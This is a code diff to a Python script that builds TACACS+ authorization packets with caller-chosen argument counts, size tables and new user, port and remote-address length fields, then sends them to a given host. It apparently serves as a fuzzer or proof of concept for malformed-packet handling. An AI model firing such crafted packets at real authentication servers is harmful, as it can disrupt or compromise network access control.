@@ -30,11 +30,12 @@ def obfuscate(body, sid, key, version, seq):
     return bytes(out)
 
 
-def build_author(arg0, rest, data, sid, key, version=0xC0, seq=1, ptype=2):
+def build_author(arg0, rest, data, sid, key, version=0xC0, seq=1, ptype=2,
+                 user_len=0, port_len=0, rem_len=0):
     # fixed fields: method, priv, authen_type, service, user_len, port_len,
     # rem_addr_len, arg_cnt
     argcnt = 1 + len(rest)
-    fixed = bytes([6, 1, 1, 1, 0, 0, 0, argcnt])
+    fixed = bytes([6, 1, 1, 1, user_len, port_len, rem_len, argcnt])
     sizetable = bytes([arg0]) + bytes(rest)
     body = fixed + sizetable + data
     datalength = len(body)
@@ -55,13 +56,15 @@ def main():
     ap.add_argument("--data", default="cmd=")
     ap.add_argument("--ptype", type=int, default=2)
     ap.add_argument("--seq", type=int, default=1)
+    ap.add_argument("--user-len", type=int, default=0)
     ap.add_argument("--timeout", type=float, default=2.0)
     args = ap.parse_args()
 
     sid = bytes.fromhex(args.sid)
     rest = [args.rest_byte] * args.rest
     pkt = build_author(args.arg0, rest, args.data.encode(), sid,
-                       args.key.encode(), seq=args.seq, ptype=args.ptype)
+                       args.key.encode(), seq=args.seq, ptype=args.ptype,
+                       user_len=args.user_len)
     s = socket.create_connection((args.host, args.port), timeout=args.timeout)
     s.settimeout(args.timeout)
     s.sendall(pkt)
